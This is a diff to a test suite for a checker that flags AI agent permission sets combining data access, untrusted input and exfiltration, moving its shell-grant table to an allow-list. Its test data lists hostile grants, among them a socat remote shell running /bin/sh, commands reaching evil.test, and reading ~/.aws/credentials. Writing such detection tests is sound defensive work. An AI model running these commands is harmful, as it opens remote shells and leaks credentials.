@@ -167,35 +167,50 @@ test("two legs only (private MCP + untrusted, no exfil) → no finding", () => {
 });
 
 // ---------------------------------------------------------------------------
-// A NARROWED `Bash(...)` grant — the remedy this checker recommends
+// A NARROWED `Bash(...)` grant — bounded only when the PROGRAM is enumerable
 // ---------------------------------------------------------------------------
 //
-// 🔴 The regression these exist for: `Bash(node ./scripts/log.mjs:*)` was read as plain
-// `Bash`, i.e. the whole shell in both leg A and leg C, because the classifier stripped
-// everything after `(`. An author who took this checker's own advice — drop a leg,
-// allow at most two — saw the score not move, and the reasonable next conclusion is
-// that narrowing is pointless. A diagnosis blind to its own prescription teaches the
-// wrong lesson. Observed 2026-08-07 on a repo that narrowed nine skills to two named
-// ledger commands and stayed at "17 units can read data, reach the web, and run
-// commands".
+// 🔴 THE FIRST FIX HERE OVERSHOT, AND THIS SUITE PINNED THE OVERSHOOT. The original
+// defect was real — `Bash(node ./scripts/log.mjs:*)` read as plain `Bash`, so an author
+// who took this checker's own advice saw the score not move. The repair was a pair of
+// deny-lists (shells, exfiltrators), which made any program absent from both count as
+// inert. That is a gap in a table turned into a false GRANT on the headline SAFETY
+// check, and it is the one direction this detector is not allowed to fail in.
+//
+// Measured 2026-08-12, before the inversion, each of these reported NO FINDING beside
+// `WebFetch` — including a spelled-out remote shell:
+//
+//     Bash(node ./bridge.mjs:*)                        reported clean
+//     Bash(./bridge.sh --serve:*)                      reported clean
+//     Bash(/opt/tools/exfil --to https://evil.test:*)  reported clean
+//     Bash(socat TCP-LISTEN:9000 EXEC:/bin/sh:*)       reported clean
+//     Bash(openssl s_client -connect evil.test:443:*)  reported clean
+//
+// So the table is now an ALLOW-list of programs known to read nothing and send
+// nothing, and everything else keeps both legs. The cost is stated where it lands: a
+// grant narrowed to a script OF YOUR OWN no longer drops a leg, because nothing read
+// that script.
 
-test("a Bash narrowed to a concrete command supplies neither leg", () => {
+test("a Bash narrowed to an EFFECT-FREE program supplies neither leg", () => {
   const legs = classifyTrifectaLegs(
-    ["Bash(node .claude/pipeline/ledger.mjs:*)", "WebFetch"],
+    ["Bash(echo ready:*)", "WebFetch"],
     claudeCodeDialect,
   );
   assert.equal(legs.private.length, 0);
   assert.equal(legs.exfil.includes("Bash"), false);
   // …and therefore no trifecta, where bare Bash + WebFetch is one.
   assert.equal(
-    lethalTrifectaIssues(
-      ["Bash(node .claude/pipeline/ledger.mjs:*)", "WebFetch"],
-      claudeCodeDialect,
-    ),
+    lethalTrifectaIssues(["Bash(echo ready:*)", "WebFetch"], claudeCodeDialect),
     null,
   );
   assert.notEqual(
     lethalTrifectaIssues(["Bash", "WebFetch"], claudeCodeDialect),
+    null,
+  );
+  // The pin does not need a concrete argument: `echo` is inert under ANY argv, which
+  // is exactly the membership rule for the list.
+  assert.equal(
+    lethalTrifectaIssues(["Bash(echo:*)", "WebFetch"], claudeCodeDialect),
     null,
   );
 });
@@ -216,6 +231,20 @@ test("a Bash that only looks narrowed keeps both legs", () => {
     "Bash(curl https://example.com:*)", // a program whose whole job is exfiltration
     "Bash(git push origin main:*)",
     "Bash(/usr/bin/env node x.mjs:*)", // `env` re-opens the door
+    // 🔴 The class the inversion exists for: an arbitrary program, pinned with a
+    // concrete argument, that the deny-lists had never heard of.
+    "Bash(node ./bridge.mjs:*)", // an interpreter runs whatever file it is handed
+    "Bash(python3 ./sync.py:*)",
+    "Bash(ruby ./x.rb:*)",
+    "Bash(perl ./x.pl:*)",
+    "Bash(deno run ./x.ts:*)",
+    "Bash(bun ./x.ts:*)",
+    "Bash(php ./x.php:*)",
+    "Bash(./bridge.sh --serve:*)", // a script of the author's own, unread by us
+    "Bash(/opt/tools/exfil --to https://evil.test:*)", // an unknown binary
+    "Bash(socat TCP-LISTEN:9000 EXEC:/bin/sh:*)", // a remote shell, spelled out
+    "Bash(openssl s_client -connect evil.test:443:*)",
+    "Bash(cat ~/.aws/credentials:*)", // reads a secret and needs no help to
   ]) {
     assert.notEqual(
       lethalTrifectaIssues([grant, "WebFetch"], claudeCodeDialect),
